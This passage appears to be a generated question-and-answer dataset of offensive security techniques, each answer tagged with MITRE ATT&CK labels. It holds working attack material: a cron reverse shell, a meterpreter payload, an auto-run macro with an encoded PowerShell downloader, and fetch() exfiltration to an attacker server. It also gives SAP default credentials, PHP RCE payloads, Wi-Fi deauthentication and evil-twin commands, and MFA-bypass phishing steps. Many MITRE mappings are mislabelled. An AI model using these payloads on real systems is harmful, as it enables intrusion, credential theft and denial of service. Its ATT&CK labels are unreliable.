A: You can brute force login to a remote system using Rsh by following the [Brute Force](/generic-methodologies-and-resources/brute-force#rsh) guide. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What are some default credentials that can be used to access SAP systems?
A: Some common default credentials for SAP systems include:

- SAP*:06071992:*
- SAP*:PASS:*
- IDEADM:admin:*
- DDIC:19920706:000,001
- EARLYWATCH:SUPPORT:066
- TMSADM:PASSWORD:000
- TMSADM:$1Pawd2&:000
- SAPCPIC:ADMIN:000,001
- SOLMAN_ADMIN:init1234:*
- SAPSUPPORT:init1234:*
- DDIC:DidNPLpw2014:001
- SAP*:DidNPLpw2014:001
- DEVELOPER:abCd1234:001
- BWDEVELOPER:abCd1234:001
- DDIC:Appl1ance:000,001
- SAP*:Appl1ance:000,001
- DEVELOPER:Appl1ance:001
- BWDEVELOPER:Appl1ance:001
- DDIC:Down1oad:000,001
- SAP*:Down1oad:000,001
- DEVELOPER:Down1oad:001
- BWDEVELOPER:Down1oad:001 MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: TA0006.

## Q: What is the command to execute a system command using the SAP ConfigServlet vulnerability?
A: The command to execute a system command using the SAP ConfigServlet vulnerability is:

```http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a``` MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, TA0011.

## Q: How can I brute force SMB credentials?
A: **This is not recommended, you could block an account if you exceed the maximum allowed tries**

```
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can I perform an SMB relay attack?
A: This attack uses the Responder toolkit to **capture SMB authentication sessions** on an internal network, and **relays** them to a **target machine**. If the authentication **session is successful**, it will automatically drop you into a **system** **shell**.
[**More information about this attack here.**](/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks) MITRE References: MITRE ID is T1212, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Lateral Movement.

## Q: How can I perform an SMB-Trap attack?
A: The Windows library URLMon.dll automatically try to authenticaticate to the host when a page tries to access some contect via SMB, for example: `img src="\\10.10.10.10\path\image.jpg"`

This happens with the functions:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

Which are used by some browsers and tools (like Skype)

### SMBTrap using MitMf MITRE References: MITRE ID is T1200, MITRE Name is: Hardware Additions, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you brute force SMTP credentials with Hydra?
A: Use the command `hydra -P {Big_Passwordlist} {IP} smtp -V` to brute force SMTP credentials with Hydra. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you crack SNMP passwords?
A: You can use the `onesixtyone` tool to crack SNMP passwords: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {IP} -w 100` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you perform brute force attacks on SSH credentials?
A: You can perform brute force attacks on SSH credentials using tools like Hydra: `hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 {IP} ssh` MITRE References: MITRE ID is T1110.003, MITRE Name is: Brute Force: Password Guessing, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you perform a brute force attack on SSH private keys?
A: You can perform a brute force attack on SSH private keys using the Nmap script `https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html` or the Metasploit module `msf> use scanner/ssh/ssh_identify_pubkeys`. MITRE References: MITRE ID is T1552.001, MITRE Name is: Unsecured Credentials: Credentials in Files, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you perform an SSH MITM attack to steal credentials?
A: To perform an SSH MITM attack, you can use the `ssh-mitm` tool. This tool diverts the victim's traffic to your machine, intercepts the connection attempt, captures the user's login details, forwards the commands to the real SSH server, executes them, and sends the results back to the user. MITRE References: MITRE ID is T1556.004, MITRE Name is: Modification of Authentication Process: SSH Authorized Keys, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass SFTP restrictions and execute commands on the server?
A: Even if users are set with non-interactive shells and confined to a specific directory, they can still request the execution of a command (like `/bin/bash`) immediately after logging in, before their designated non-interactive shell takes over. This allows for unauthorized command execution, undermining the intended security measures. MITRE References: MITRE ID is T1570, MITRE Name is: Lateral Tool Transfer, and MITRE Tactics are: TA0008, Lateral Movement.

## Q: How can you create a symlink to bypass SFTP restrictions?
A: If you have writable rights in some folder, you can create symlinks of other folders/files using the `symlink` command in SFTP. This can allow you to access the symlinked files through a no-chroot service, such as a web server. MITRE References: MITRE ID is T1036.003, MITRE Name is: Masquerading: Rename System Utilities, and MITRE Tactics are: TA0005, Defense Evasion.

## Q: How can you brute force a VNC server?
A: You can brute force a VNC server using the techniques described in the [**Brute force**](/generic-methodologies-and-resources/brute-force#vnc) section. MITRE References: MITRE ID is T1110.001, MITRE Name is: Brute Force: Password Guessing, and MITRE Tactics are: Credential Access.

## Q: How can you use `sipflood.py` from `sippts` to perform a DoS attack against a VoIP server?
A: The `sipflood.py` tool from `sippts` can be used to perform a DoS attack against a VoIP server. The command `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v` can be used to send unlimited INVITE messages to the target VoIP server at 10.10.0.10 on port 5080, potentially causing a denial of service. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: How do you perform a deauthentication attack using Aireplay-ng?
A: To perform a deauthentication attack using Aireplay-ng, use the following command:

```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- `-0` means deauthentication
- `0` is the number of deauths to send (continuously)
- `-a 00:14:6C:7E:40:80` is the MAC address of the access point
- `-c 00:0F:B5:34:30:30` is the MAC address of the client to deauthenticate (omit to broadcast deauth)
- `ath0` is the interface name MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: TA0040.

## Q: How do you perform a disassociation attack using mdk4?
A: To perform a disassociation attack using mdk4, use the following command:

```
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters are optional, you could give only the ESSID and mdk4 will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
``` MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: TA0040.

## Q: How do you perform a WPS PIN brute-force attack using Reaver and Bully?
A: To perform a WPS PIN brute-force attack using Reaver and Bully, use the following commands:

Reaver:
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
```
Bully:
```
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How do you perform a WPS NULL PIN attack using Reaver?
A: To perform a WPS NULL PIN attack using Reaver, use the following command:

```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
``` MITRE References: MITRE ID is T1111, MITRE Name is: Two-Factor Authentication Interception, and MITRE Tactics are: TA0006.

## Q: How do you create a WPA/WPA2 Evil Twin Access Point using EAPHammer?
A: To create a WPA/WPA2 Evil Twin Access Point using EAPHammer, use the following command:```./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"``` MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: TA0003.

## Q: How do you perform a KARMA, MANA, Loud MANA, and Known Beacon attack using EAPHammer?
A: To perform a KARMA, MANA, Loud MANA, and Known Beacon attack using EAPHammer, use the following commands:KARMA:```./eaphammer -i wlan0 --cloaking full --mana [--captive-portal] [--auth wpa-psk --creds]```MANA:```./eaphammer -i wlan0 --cloaking full --mana [--captive-portal] [--auth wpa-psk --creds]```Loud MANA:```./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]```Known Beacon:```./eaphammer -i wlan0 --mana [--loud] --known-beacons --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]``` MITRE References: MITRE ID is T1069, MITRE Name is: Permission Groups Discovery, and MITRE Tactics are: TA0007.

## Q: How can you use the performance.now() API to perform a timing attack and extract sensitive information?
A: To perform a timing attack using the `performance.now()` API, you can follow these steps:1. Measure the time it takes to perform an operation with a known input.2. Measure the time it takes to perform the same operation with an unknown input.3. Compare the execution times. If there is a significant difference, you can infer information about the unknown input.In the example provided, the code uses this technique to guess the characters of a flag by measuring the time it takes to search for each character. If the search takes longer than 200ms, it assumes the character is part of the flag. MITRE References: MITRE ID is T1201, MITRE Name is: Timing Attack, and MITRE Tactics are: Discovery.

## Q: How can you send data to a VPS to exfiltrate information?
A: The code uses the `fetch()` function to send data to a VPS at the URL `http://vps?data=` followed by the encoded data. This can be used to exfiltrate information from the target system to the attacker's VPS. MITRE References: MITRE ID is T1565, MITRE Name is: Data Manipulation, and MITRE Tactics are: Exfiltration.

## Q: How can the perl-cisco-copyconfig tool be used in a Penetration Test to gain access to Cisco devices?
A: The perl-cisco-copyconfig tool can be used to copy the running configuration of Cisco devices via SNMP and TFTP. This can be useful in a penetration test to gain access to sensitive configuration details, passwords, or other information that may be present in the running config. To use the tool, you'll need to know the SNMP community string for the target device. Once you have that, you can use the `Cisco::CopyConfig` module to retrieve the configuration. For example, using version 1.4 of the tool, you can run the following code to download the running config to a local file:

```perl
use Cisco::CopyConfig;

$cc = Cisco::CopyConfig->new({
    snmp_community => 'public',
    snmp_host => '10.0.0.1',
    tftp_server => '10.0.0.2',
    tftp_filename => 'cisco_config.txt'
});

$cc->copy_running_to_tftp(); MITRE References: MITRE ID is T1217, MITRE Name is: Remote System Discovery, and MITRE Tactics are: Discovery.

## Q: How could the perl-cisco-copyconfig tool be used to backdoor Cisco devices during a penetration test?
A: The perl-cisco-copyconfig tool should not be used to backdoor or maliciously modify Cisco device configurations, as that would be unethical and likely illegal. The tool is intended for legitimate network management purposes, such as making authorized configuration backups. Instead, I recommend focusing penetration testing efforts on identifying and reporting vulnerabilities through proper channels, in order to improve the overall security of the systems involved. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you use a cronjob to establish a reverse shell as a persistence mechanism?
A: To use a cronjob to establish a reverse shell as a persistence mechanism, you can set up a cronjob that runs a script or command to connect back to your machine. For example:

```
crontab -e
*/10 * * * * 0<&196;exec 196<>/dev/tcp/192.168.1.102/5556; sh <&196 >&196 2>&196
```

This will run a reverse shell to your machine (192.168.1.102:5556) every 10 minutes. You'll also need to set up a netcat listener on your end to receive the connection. MITRE References: MITRE ID is T1053, MITRE Name is: Scheduled Task/Job, and MITRE Tactics are: Persistence.

## Q: How can you use Metasploit's persistence module to establish a persistent backdoor?
A: To use Metasploit's persistence module to establish a persistent backdoor, you can create a malicious binary and run it to get a meterpreter shell, then use the `persistence` module to set up a persistent backdoor. The steps would be:

1. Create a malicious binary using Metasploit (e.g. `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=4444 -f elf > backdoor.elf`)
2. Run the binary to get a meterpreter shell
3. In the meterpreter session, run `exploit/multi/manage/persistence` to set up a persistent backdoor MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Persistence.

## Q: How can you use Nmap scripts to establish a persistent backdoor?
A: Nmap has some scripts that can be used to establish a persistent backdoor, such as the `http-put` and `http-fileupload-extension` scripts. These scripts can be used to upload and execute malicious code on the target system. However, these methods are highly dependent on the specific target and configuration, and using them would likely be considered malicious activity. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you use a setuid binary to escalate privileges and establish a persistent backdoor?
A: To use a setuid binary to escalate privileges and establish a persistent backdoor, you can follow these steps:

1. Create a binary that will give you a shell when executed.
2. Set the owner of the binary to root and the setuid bit:

```
chown root myBinary
chmod u+s myBinary
```

3. Place the binary in a location that can be executed by the target user (e.g. a web server directory).

When the target user executes the binary, it will run with root privileges, allowing you to escalate and establish a persistent backdoor. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Persistence.

## Q: How can an attacker create a phar file to execute arbitrary commands?
A: An attacker can create a phar file that contains a class with a __destruct() method that executes arbitrary commands. The attacker can create the phar file by:

1. Creating a new Phar object and starting the buffering.
2. Adding a file (e.g. 'test.txt') with some content to the phar.
3. Setting the stub of the phar to include the PHP __HALT_COMPILER(); function.
4. Creating an object of the vulnerable class and setting it as the phar metadata.
5. Stopping the buffering to create the final phar file.

The attacker can then execute the phar file using functions like file_get_contents(), fopen(), file(), file_exists(), md5_file(), filemtime() or filesize() to trigger the deserialization and execute the arbitrary command. MITRE References: MITRE ID is T1203, MITRE Name is: Phar Deserialization, and MITRE Tactics are: Defense Evasion, Execution.

## Q: How can you use macros to run arbitrary code from a document?
A: It's possible to use macros to run arbitrary code from the document. Some common techniques include using AutoOpen() and Document_Open() functions to autoload and execute macros, as well as embedding malicious code in the macro itself. For example, the following VBA macro code can execute PowerShell commands to download and run a payload: 

Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgBFAG4AZAAgAFMAdQBiAA==")
End Sub

There are also techniques to manually remove macro metadata and use other file types like RTF to bypass security controls around macros. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you force NTLM authentication remotely?
A: There are several ways to force NTLM authentication "remotely", for example, you could add invisible images to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the address of files that will trigger an authentication just for opening the folder. Don't forget that you cannot only steal the hash or the authentication but also perform NTLM relay attacks. MITRE References: MITRE ID is T1075, MITRE Name is: Pass the Hash, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can you use HTA files to execute malicious code?
A: An HTA (HTML Application) is a Windows program that combines HTML and scripting languages (such as VBScript and JScript). It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model. An HTA is executed using mshta.exe, which is typically installed along with Internet Explorer, making it dependent on IE. This allows HTAs to run arbitrary code with the full permissions of the current user. Example HTA code to execute "calc.exe":

<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html> MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: Execution.

## Q: What are some domain name variation techniques that can be used in phishing?
A: Some domain name variation techniques for phishing include:

- **Keyword**: The domain name contains an important keyword of the original domain (e.g., zelster.com-management.com).
- **Hypened subdomain**: Change the dot for a hyphen of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a new TLD (e.g., zelster.org)
- **Homoglyph**: It replaces a letter in the domain name with letters that look similar (e.g., zelfser.com).
- **Transposition**: It swaps two letters within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes "s" at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It removes one of the letters from the domain name (e.g., zelser.com).
- **Repetition**: It repeats one of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a dot inside the domain name (e.g., ze.lster.com).
- **Insertion**: It inserts a letter into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name (e.g., zelstercom.com) MITRE References: MITRE ID is T1566.002, MITRE Name is: Phishing: Spearphishing Link, and MITRE Tactics are: Initial Access.

## Q: How can you configure the email server and domain for a phishing campaign?
A: To configure the email server and domain for a phishing campaign:1. Configure Reverse DNS (rDNS) record to resolve the VPS IP address to the domain name.2. Set up a Sender Policy Framework (SPF) record for the domain using a tool like https://www.spfwizard.net/. The SPF record should look like: `v=spf1 mx a ip4:ip.ip.ip.ip ?all`3. Configure a Domain-based Message Authentication, Reporting & Conformance (DMARC) record for the domain by creating a new DNS TXT record for `_dmarc.<domain>` with the content: `v=DMARC1; p=none`4. Set up DomainKeys Identified Mail (DKIM) signing for the domain.5. Test the email configuration using tools like https://www.mail-tester.com/ and by sending test emails to check the authentication results.6. If the domain or IP is blacklisted, request to be removed from the blacklists. MITRE References: MITRE ID is T1566.002, MITRE Name is: Phishing: Spearphishing Link, and MITRE Tactics are: Initial Access.

## Q: How can you create and launch a phishing campaign using GoPhish?
A: To create and launch a phishing campaign using GoPhish:1. Set up a Sending Profile in GoPhish with the email account details you want to use for the campaign.2. Create an Email Template with the subject, body, and tracking image.3. Set up a Landing Page with the HTML code of the page you want to use to steal credentials.4. Import the target Users and Groups into GoPhish.5. Create a new Campaign, selecting the Email Template, Landing Page, Sending Profile, and target Group.6. Review the campaign settings and send a test email to verify everything is working as expected.7. Launch the campaign and monitor the results in the GoPhish web interface. MITRE References: MITRE ID is T1566.002, MITRE Name is: Phishing: Spearphishing Link, and MITRE Tactics are: Initial Access.

## Q: How can you bypass multi-factor authentication (MFA) in a phishing attack?
A: There are a few ways to bypass MFA in a phishing attack:1. **Via Proxy MitM**: Tools like evilginx2, CredSniper, and muraena can perform a man-in-the-middle attack to capture the victim's credentials and MFA code, allowing you to authenticate to the real website.2. **Via VNC**: With a tool like EvilnVNC, you can send the victim to a VNC session where you can see their screen and interact with the real website, capturing their credentials and MFA code.Both of these approaches involve impersonating the login page and proxying the victim's authentication to the real website, allowing you to steal their credentials and MFA code. MITRE References: MITRE ID is T1106, MITRE Name is: Authentication Log Tampering, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: What is a way to bypass OTP protections or perform a brute force attack on phone numbers?
A: It's possible to add strings at the end the phone number that could be used to exploit common injections (XSS, SQLi, SSRF...) or even to bypass protections. OTP Bypass / Bruteforce would work like this. MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you add strings to the end of a phone number to potentially exploit vulnerabilities?
A: It's possible to add strings at the end the phone number that could be used to exploit common injections (XSS, SQLi, SSRF...) or even to bypass protections. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can phpsploit be used to establish a remote connection to a compromised web server?
A: phpsploit can be used to establish a stealthy remote connection to a compromised web server. To do this, you would first need to upload the phpsploit payload to the target server. Then, you can use the `phpsploit` command with the `-t` flag to specify the target URL and connect to the server. Once connected, you can execute commands on the remote system using phpsploit's interactive shell-like interface. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: What are some ways phpsploit can be used for privilege escalation on a compromised web server?
A: phpsploit can be used to perform various privilege escalation techniques on a compromised web server. For example, you could use phpsploit's built-in `shell` and `exec` commands to explore the target system and identify opportunities for further exploitation. You could also use phpsploit to upload additional tools or scripts to the server and execute them in the context of the compromised user account. Additionally, phpsploit supports various post-exploitation modules and plugins that can be used to elevate privileges and move laterally across the network. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Privilege Escalation, Lateral Movement.

## Q: How can phpsploit be used to maintain persistence on a compromised web server?
A: phpsploit can be used to maintain persistence on a compromised web server by establishing a stealthy, long-running remote connection. This can be achieved by scheduling the phpsploit payload to run periodically (e.g., as a cron job) or by leveraging phpsploit's built-in session management features to resume a previous connection. Additionally, phpsploit supports various techniques for hiding its presence, such as URL obfuscation and encrypted communications, which can help evade detection by security measures on the target system. MITRE References: MITRE ID is T1136, MITRE Name is: Create Account, and MITRE Tactics are: Persistence.

## Q: How can you abuse PHP deserialization, spl_autoload_register, and LFI/Gadget to achieve remote code execution?
A: To abuse this, you can follow these steps:1. Find a PHP deserialization vulnerability where there are no available gadgets in the current application.2. Abuse the `spl_autoload_register()` function to load any local file with a `.php` extension.3. Load the composer autoloader of a different webapp in the same container that has a vulnerable library.4. Generate a `phpggc` payload to abuse the vulnerable library and create a PHP file with malicious commands in the `/tmp/` directory.5. Use the initial deserialization vulnerability to load the generated PHP file and execute the malicious commands.This allows you to achieve remote code execution even if the initial application doesn't have any available gadgets. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can you achieve Remote Code Execution (RCE) by abusing object creation in PHP?
A: The syntax `new $a($b)` can be used to instantiate an object where `$a` represents the class name and `$b` is the first argument passed to the constructor. These variables can be sourced from user inputs like GET/POST, where they may be strings or arrays, or from JSON, where they might present as other types. By setting `$a` to a custom class or a built-in PHP class with a vulnerable constructor, and `$b` to a system command, you can achieve Remote Code Execution (RCE). MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: TA0002, TA0004.

## Q: How can you exploit autoloading functions to achieve RCE in PHP?
A: Autoloading functions, defined using `spl_autoload_register` or `__autoload`, can be exploited if no such classes are directly accessible. These functions automatically load classes from files when needed. The behavior of autoloading varies with PHP versions, offering different RCE possibilities. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0002, TA0004.

## Q: How can you achieve RCE using built-in PHP classes?
A: Lacking custom classes or autoloaders, built-in PHP classes may suffice for RCE. The number of these classes ranges between 100 to 200, based on PHP version and extensions. They can be listed using `get_declared_classes()`. Constructors of interest can be identified through the reflection API. RCE can be achieved via specific methods like SSRF + Phar Deserialization, exploiting PDOs, and leveraging SoapClient/SimpleXMLElement for XXE attacks. MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: TA0002, TA0004.

## Q: How can you achieve RCE by exploiting the Imagick extension in PHP?
A: The Imagick extension can be leveraged for command execution by instantiating new objects. The VID parser capability of writing content to any specified path in the filesystem can be used to place a PHP shell in a web-accessible directory, achieving Remote Code Execution (RCE). Additionally, the VID parser can handle wildcards in file paths, facilitating the transfer of temporary uploaded files to a chosen location, which can also lead to arbitrary file writing and RCE. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0002, TA0004.

## Q: How can you bypass PHP `preg_match()` using a newline?
A: `preg_match()` only checks the first line of the user input. If you can send the input in several lines, you can bypass the check:

```$myinput="aaaaaaa
11111111"; //Notice the new lineecho preg_match("/1/",$myinput);//1  --> In this scenario preg_match finds the char "1"echo preg_match("/1.*$/",$myinput);//1  --> In this scenario preg_match finds the char "1" echo preg_match("/^.*1/",$myinput);//0  --> In this scenario preg_match DOESN'T find the char "1"echo preg_match("/^.*1.*$/",$myinput);//0  --> In this scenario preg_match DOESN'T find the char "1"```

To bypass this check, you can send the value with new-lines URL-encoded (`%0A`) or if you can send JSON data, send it in several lines. MITRE References: MITRE ID is T1505, MITRE Name is: Webshell, and MITRE Tactics are: TA0003.

## Q: How can you bypass PHP `preg_match()` using a length error?
A: If you can send a very large input to `preg_match()`, it won't be able to process it and you may be able to bypass the check. For example, if it is blacklisting a JSON, you could send:

```payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'``` MITRE References: MITRE ID is T1505, MITRE Name is: Webshell, and MITRE Tactics are: TA0003.

## Q: How can you use type juggling for PHP obfuscation?
A: You can obfuscate PHP code by leveraging type juggling. For example:```$obfs = "1"; //string "1"$obfs++; //int 2$obfs += 0.2; //float 2.2$obfs = 1 + "7 IGNORE"; //int 8$obfs = "string" + array("1.1 striiing")[0]; //float 1.1$obfs = 3+2 * (TRUE + TRUE); //int 7$obfs .= ""; //string "7"$obfs += ""; //int 7``` MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you exploit path traversal and file inclusion vulnerabilities in PHP?
A: Check the [pageFile Inclusion/Path traversal](/pentesting-web/file-inclusion) page for more information on how to exploit path traversal and file inclusion vulnerabilities in PHP. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: TA0001.

## Q: How can you exploit PHP errors to bypass HTTP headers?
A: If a PHP page is printing errors and echoing back some input provided by the user, the user can make the PHP server print back some content long enough so when it tries to add the headers into the response, the server will throw an error. This can lead to the server not being able to modify the header information, such as not sending the CSP header to the user. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: What are some ways to achieve code execution in PHP?
A: Some ways to achieve code execution in PHP include:

- `system("ls");`
- `ls;`
- `shell_exec("ls");`

[Check this for more useful PHP functions](/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: TA0002.

## Q: How can you achieve RCE via `preg_replace()` in PHP?
A: To execute code in the "replace" argument of `preg_replace()`, at least one match is needed. This option has been deprecated as of PHP 5.5.0.

```preg_replace(pattern,replace,base)preg_replace("/a/e","phpinfo()","whatever")``` MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: TA0002.

## Q: How can you achieve RCE via `eval()` in PHP?
A: You can achieve RCE via `eval()` in PHP using payloads like:

```'.system('uname -a'); $dummy=''.system('uname -a');#'.system('uname -a');//'.phpinfo().'<?php phpinfo(); ?>``` MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: TA0002.

## Q: How can you achieve RCE via `assert()` in PHP?
A: The `assert()` function in PHP allows you to execute code that is written in a string. To get RCE, you can break the code syntax, add your payload, and then fix it again. You can use logic operations such as "and" or "&amp;&amp;" or "|".

```?page=a','NeVeR') === false and system('ls') and strpos('a``` MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: TA0002.

## Q: How can you achieve RCE via `usort()` in PHP?
A: The `usort()` function in PHP is used to sort an array of items using a specific function. You can abuse this function to achieve RCE:

```<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>VALUE: );phpinfo();#<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>``` MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: TA0002.

## Q: How can you achieve RCE via a .htaccess file in PHP?
A: If you can upload a `.htaccess` file, you can configure several things and even execute code (by configuring that files with the `.htaccess` extension can be executed). Different `.htaccess` shells can be found [here](https://github.com/wireghoul/htshells). MITRE References: MITRE ID is T1505, MITRE Name is: Webshell, and MITRE Tactics are: TA0003.

## Q: How can you achieve RCE via environment variables in PHP?
A: If you find a vulnerability that allows you to modify environment variables in PHP (and another one to upload files, although with more research maybe this can be bypassed), you could abuse this behavior to get RCE. Some environment variables that can be used include:

- `LD_PRELOAD`: This env variable allows you to load arbitrary libraries when executing other binaries.
- `PHPRC`: This variable instructs PHP on where to locate its configuration file, usually called `php.ini`. If you can upload your own config file, use `PHPRC` to point PHP at it and add an `auto_prepend_file` entry to execute your own code. MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: TA0002.

## Q: How can you bypass PHP's disable_functions setting?
A: There are several ways to bypass disable_functions if some specific module is being used or exploit some specific PHP version:

- FastCGI/PHP-FPM (FastCGI Process Manager)
- Bypass with FFI - Foreign Function Interface enabled
- Bypass via mem
- mod_cgi
- PHP Perl Extension Safe_mode
- dl function
- Leveraging callbacks in certain PHP functions
- Exploiting specific PHP versions and configurations MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you bypass PHP's open_basedir restriction?
A: To bypass open_basedir restrictions, you can try the following techniques:

- Use the glob:// protocol with path bypasses to list directories
- Abuse PHP-FPM and FastCGI to completely bypass open_basedir
